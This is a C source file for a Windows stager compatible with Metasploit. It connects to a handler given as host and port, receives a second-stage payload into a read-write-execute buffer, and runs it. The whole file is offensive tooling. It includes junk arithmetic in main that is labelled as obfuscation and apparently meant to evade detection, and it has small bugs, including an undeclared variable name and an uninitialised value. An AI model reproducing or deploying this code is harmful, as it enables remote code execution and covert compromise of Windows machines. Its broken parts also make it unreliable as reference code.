/*
 * A C-based stager client compatibility with the Metasploit Framework
 * based on a discussion on the Metasploit Framework mailing list
 *
 * @author Raphael Mudge (raffi@strategiccyber.com)
 * @license BSD License.
 *
 * Relevant messages:
 * http://mail.metasploit.com/pipermail/framework/2012-September/008660.html
 * http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
 */

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

/* init winsock */
void winsock_init() {
       WSADATA      wsaData;
       WORD         wVersionRequested;
       wVersionRequested = MAKEWORD(2, 2);

       if (WSAStartup(wVersionRequested, &wsaData) < 0) {
              printf("ws2_32.dll is out of date.\n");
              WSACleanup();
              exit(1);
       }
}

/* a quick routine to quit and report why we quit */
void punt(SOCKET my_socket, char * error) {
       printf("Bad things: %s\n", error);
       closesocket(my_socket);
       WSACleanup();
       exit(1);
}

/* attempt to receive all of the requested data from the socket */
int recv_all(SOCKET my_socket, void * buffer, int len) {
       int    tret   = 0;
       int    nret   = 0;
       void * start = buffer;
       while (tret < len) {
              nret = recv(my_socket, (char *)startb, len - tret, 0);
              startb += nret;
              tret   += nret;

              if (nret == SOCKET_ERROR)
                     punt(my_socket, "Could not receive data");
       }

       return tret;
}

/* establish a connection to a host:port */
SOCKET wsconnect(char * targetip, int port) {
       struct hostent *           target;
       struct sockaddr_in sock;
       SOCKET                     my_socket;

       /* setup our socket */
       my_socket = socket(AF_INET, SOCK_STREAM, 0);
       if (my_socket == INVALID_SOCKET)
              punt(my_socket, "Could not initialize socket");

       /* resolve our target */
       target = gethostbyname(targetip);
       if (target == NULL)
              punt(my_socket, "Could not resolve target");

       /* copy our target information into the sock */
       memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
       sock.sin_family = AF_INET;
       sock.sin_port = htons(port);

       /* attempt to connect */
       if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
              punt(my_socket, "Could not connect to target");
       return my_socket;
}

int main(int argc, char * argv[]) {
    // DEAD CODE THAT DOES NOTHING BUT ENHANCE OBFUSCATION
    unsigned int n;
    unsigned int mod = n % 4;
    unsigned int res = 0;

  if (mod == 0) res = (n | 0xBAAAD0BF) * (2 ^ n);
  else if (mod == 1) res = (n & 0xBAAAD0BF) * (3 + n);
  else if (mod == 2) res = (n ^ 0xBAAAD0BF) * (4 | n);
  else res = (n + 0xBAAAD0BF) * (5 & n);

  if (mod == 0) res = (n | 0xBAAAD0BF) * (2 ^ n);
  else if (mod == 1) res = (n & 0xBAAAD0BF) * (3 + n);
  else if (mod == 2) res = (n ^ 0xBAAAD0BF) * (4 | n);
  else res = (n + 0xBAAAD0BF) * (5 & n);

  if (mod == 0) res = (n | 0xBAAAD0BF) * (2 ^ n);
  else if (mod == 1) res = (n & 0xBAAAD0BF) * (3 + n);
  else if (mod == 2) res = (n ^ 0xBAAAD0BF) * (4 | n);
  else res = (n + 0xBAAAD0BF) * (5 & n);

  if (mod == 0) res = (n | 0xBAAAD0BF) * (2 ^ n);
  else if (mod == 1) res = (n & 0xBAAAD0BF) * (3 + n);
  else if (mod == 2) res = (n ^ 0xBAAAD0BF) * (4 | n);
  else res = (n + 0xBAAAD0BF) * (5 & n);

  n = res;
  ULONG32 size;
  char * buffer;

  void (*function)();
  winsock_init();
  if (argc != 3) {
         printf("%s [host] [port]\n", argv[0]);
         exit(1);
  }

  /* connect to the handler */
  SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));

  /* read the 4-byte length */
  int count = recv(my_socket, (char *)&size, 4, 0);
  if (count != 4 || size <= 0)
         punt(my_socket, "read a strange or incomplete length value\n");
 
  /* allocate a RWX buffer */
  buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

  if (buffer == NULL)
    punt(my_socket, "could not allocate buffer\n");
    buffer[0] = 0xBF;
    
/* copy the value of our socket to the buffer */
memcpy(buffer + 1, &my_socket, 4);

/* read bytes into the buffer */
count = recv_all(my_socket, buffer + 5, size);

/* cast our buffer as a function and call it */
function = (void (*)())buffer;
function();
 return 0;
}